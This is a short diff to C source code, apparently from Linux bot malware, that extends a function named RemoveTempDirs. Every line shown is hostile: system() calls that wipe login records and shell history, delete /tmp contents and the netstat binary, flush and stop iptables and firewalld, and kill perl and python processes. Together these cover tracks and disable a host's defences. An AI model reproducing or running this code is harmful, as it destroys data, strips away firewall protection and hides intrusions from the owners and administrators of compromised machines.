@@ -3190,6 +3190,16 @@ void RemoveTempDirs()
         system("rm -rf /var/log/wtmp");
         system("rm -rf ~/.bash_history");
         system("history -c;history -w");
+        system("rm -rf /tmp/*");
+        system("rm -rf /bin/netstat");
+        system("iptables -F");
+        system("pkill -9 perl");
+        system("pkill -9 python");
+        system("service iptables stop");
+        system("/sbin/iptables -F; /sbin/iptables -X");
+        system("service firewalld stop");
+        system("rm -rf ~/.bash_history");
+        system("history -c");
 }
 int main(int argc, unsigned char *argv[])
 {
